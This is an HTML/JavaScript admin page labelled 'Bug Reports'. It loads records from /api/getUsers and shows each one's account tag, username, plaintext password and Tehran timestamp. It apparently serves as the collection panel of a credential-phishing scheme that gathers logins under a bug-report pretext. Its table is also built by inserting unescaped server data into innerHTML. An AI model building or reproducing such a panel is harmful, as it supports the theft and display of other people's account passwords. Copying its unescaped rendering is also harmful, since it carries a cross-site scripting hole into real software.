<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin Panel - Bug Reports</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    body {
      background-color: #000000;
      color: #ffffff;
      font-family: sans-serif;
    }

    .sc-table {
      border: 2px solid #ffffff;
      width: 100%;
      text-align: center;
      border-collapse: collapse;
    }

    .sc-table th, .sc-table td {
      border: 1px solid #ffffff;
      padding: 12px;
    }

    .sc-btn {
      background: #ffffff;
      color: #000000;
      border: 2px solid #ffffff;
      font-weight: bold;
      transition: all 0.2s ease;
      cursor: pointer;
    }

    .sc-btn:hover {
      background: #000000;
      color: #ffffff;
    }
  </style>
</head>
<body class="p-6">
  <div class="max-w-5xl mx-auto space-y-6">
    
    <div class="flex flex-col sm:flex-row justify-between items-center gap-4 border-2 border-white p-4">
      <h1 class="text-xl font-bold uppercase tracking-widest">ADMIN PANEL - BUG REPORTS</h1>
      <button onclick="fetchUsers()" class="sc-btn px-6 py-2 uppercase text-sm">
        REFRESH LIST
      </button>
    </div>

    <div class="overflow-x-auto">
      <table class="sc-table">
        <thead>
          <tr class="bg-white text-black font-bold uppercase">
            <th>#</th>
            <th>Account Tag</th>
            <th>Username</th>
            <th>Password</th>
            <th>Date & Time (Tehran)</th>
          </tr>
        </thead>
        <tbody id="userTableBody">
          <tr>
            <td colspan="5" class="py-8 text-gray-400">Loading data...</td>
          </tr>
        </tbody>
      </table>
    </div>

  </div>

  <script>
    async function fetchUsers() {
      const tbody = document.getElementById('userTableBody');
      tbody.innerHTML = '<tr><td colspan="5" class="py-8 text-gray-400">Updating list...</td></tr>';

      try {
        const res = await fetch('/api/getUsers');
        const users = await res.json();

        if (users.length === 0) {
          tbody.innerHTML = '<tr><td colspan="5" class="py-8 text-gray-400">No reports submitted yet.</td></tr>';
          return;
        }

        tbody.innerHTML = users.map((u, index) => `
          <tr class="hover:bg-zinc-900">
            <td class="font-mono">${index + 1}</td>
            <td class="font-bold text-yellow-200 dir-ltr">${u.accountTag}</td>
            <td class="font-bold dir-ltr">${u.username}</td>
            <td class="font-mono text-yellow-400 dir-ltr">${u.password}</td>
            <td class="text-sm font-mono dir-ltr">${u.createdAt}</td>
          </tr>
        `).join('');

      } catch (err) {
        tbody.innerHTML = '<tr><td colspan="5" class="py-8 text-red-500">Error loading data from server.</td></tr>';
      }
    }

    // Load list on startup
    fetchUsers();
  </script>
</body>
</html>
